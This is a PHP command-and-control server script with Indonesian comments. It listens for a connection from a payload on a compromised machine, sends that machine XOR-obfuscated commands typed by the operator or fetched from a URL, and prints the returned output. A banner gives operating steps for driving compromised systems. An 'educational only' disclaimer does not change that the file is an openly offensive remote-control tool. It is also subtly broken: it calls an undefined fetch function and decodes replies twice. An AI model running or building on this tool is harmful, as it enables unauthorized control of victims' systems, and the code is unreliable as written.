<?php
// Skrip PHP C2 server ini memungkinkan komunikasi jarak jauh menggunakan enkripsi XOR 
// untuk transmisi data yang aman antara server penyerang dan target. 
// Pilihan (perintah atau URL) dienkripsi menggunakan enkripsi XOR dengan kunci yang 
// ditentukan pengguna sebelum dikirim ke target.

// Skrip ini hanya untuk simulasi dan masih dalam tahap pengembangan
// php C2-Server.php

// Penafian: Skrip ini hanya untuk tujuan edukasi, dan penggunaan tanpa izin dapat menyebabkan konsekuensi hukum.

// Fungsi untuk mendekripsi data menggunakan XOR
function xor_encrypt($data, $key) {
    $output = '';
    for ($i = 0; $i < strlen($data); ++$i) {
        // Melakukan operasi XOR antara karakter data dengan karakter kunci secara siklus
        $output .= $data[$i] ^ $key[$i % strlen($key)];
    }
    return $output;
}

// Fungsi untuk mengirim output yang telah dienkripsi ke payload
function send_to_payload($socket, $data, $encryption_key) {
    // Enkripsi data sebelum dikirim
    $encrypted_data = xor_encrypt($data, $encryption_key);
    // Kirim data yang telah dienkripsi melalui soket
    socket_write($socket, $encrypted_data, strlen($encrypted_data));
}

// Fungsi untuk menerima perintah yang telah dienkripsi dari payload
function receive_from_payload($socket, $buffer_size, $encryption_key) {
    // Membaca data yang diterima dari soket
    $encrypted_data = socket_read($socket, $buffer_size);
    // Mendekripsi data yang diterima
    return xor_encrypt($encrypted_data, $encryption_key);
}

// Menampilkan banner dengan petunjuk penggunaan
echo "\033[0;32m";
echo <<<BANNER

 ############################################################################################
# 1. Atur server web atau server HTTP yang dapat menyajikan konten teks.                    #
# 2. Unggah file teks berisi perintah yang ingin dijalankan pada sistem yang terkompromi.   #
# 3. Pastikan file teks dapat diakses melalui HTTP dan catat URL-nya.                       #
# 4. Ketika diminta oleh skrip, masukkan URL yang Anda dapatkan di langkah ini.             #
# CATATAN: Jika Anda memilih untuk mengambil perintah dari URL, skrip akan meminta URL.     #
# Jika Anda memilih untuk memasukkan perintah secara langsung, masukkan perintahnya.        #
 ###########################################################################################

BANNER;
echo "\033[0m\n"; 

// Meminta input IP penyerang
$attacker_ip = readline("[*] Enter your IP: ");
// Meminta input port server C2
$c2_port = readline("[*] Enter C2 server port: ");
// Meminta kunci enkripsi XOR dari pengguna
$encryption_key = readline("[*] Enter XOR encryption key: ");

// Membuat soket dengan protokol TCP/IP
$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
if ($socket === false) {
    echo "Socket creation failed: " . socket_strerror(socket_last_error()) . "\n";
    exit(1);
}

// Mengikat soket ke alamat IP dan port yang ditentukan
if (!socket_bind($socket, $attacker_ip, $c2_port)) {
    echo "Socket bind failed: " . socket_strerror(socket_last_error()) . "\n";
    exit(1);
}

// Menyimak koneksi masuk pada soket
if (!socket_listen($socket, 5)) {
    echo "Socket listen failed: " . socket_strerror(socket_last_error()) . "\n";
    exit(1);
}

echo "[*] Waiting for incoming connection...\n";

// Menerima koneksi yang masuk
$client_socket = socket_accept($socket);
if ($client_socket === false) {
    echo "Socket accept failed: " . socket_strerror(socket_last_error()) . "\n";
    exit(1);
}

// Loop utama untuk mengambil dan mengeksekusi perintah
while (true) {
    // Meminta metode input perintah kepada pengguna
    $input_method = strtolower(readline("[*] Choose command input method (url/command): "));
    if ($input_method === 'url') {
        // Mengambil perintah dari URL
        $command_url = readline("[*] Enter command URL: ");
        $command_encrypted = fetch_commands($command_url);
        if ($command_encrypted === false) {
            echo "Error fetching commands from $command_url.\n";
            continue;
        }
        // Mengirim perintah yang dienkripsi ke payload
        send_to_payload($client_socket, $command_encrypted, $encryption_key);
    } elseif ($input_method === 'command') {
        // Mendapatkan perintah langsung dari pengguna
        $command = readline("[*] Enter command to execute: ");
        // Mengirim perintah yang dienkripsi ke payload
        send_to_payload($client_socket, $command, $encryption_key);
    } else {
        // Validasi jika input tidak valid
        echo "Invalid input method. Please choose 'url' or 'command'.\n";
        continue;
    }

    // Menerima output yang dienkripsi dari payload
    $output_encrypted = receive_from_payload($client_socket, 4096, $encryption_key);

    // Mendekripsi output
    $output = xor_encrypt($output_encrypted, $encryption_key);

    // Menampilkan output perintah yang telah didekripsi
    echo "[*] Command Output:\n$output\n";

    // Menunggu beberapa saat sebelum mengambil perintah baru
    sleep(10);
}

// Menutup soket
socket_close($client_socket);
socket_close($socket);

?>
